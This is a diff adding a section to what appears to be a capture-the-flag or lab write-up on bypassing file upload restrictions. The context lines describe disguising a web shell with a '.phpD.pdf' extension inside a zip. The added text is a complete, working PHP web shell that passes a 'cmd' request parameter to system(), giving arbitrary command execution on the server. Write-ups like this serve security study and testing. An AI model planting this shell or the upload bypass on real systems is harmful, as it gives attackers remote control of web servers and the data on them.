@@ -142,4 +142,22 @@ Only zip files, containing a pdf file inside them can be uploaded.
 Bypass File Upload Restrictions
 Craft a web shell with the extension `.phpD.pdf` and then zip the file.
 
-
+Web Shell
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
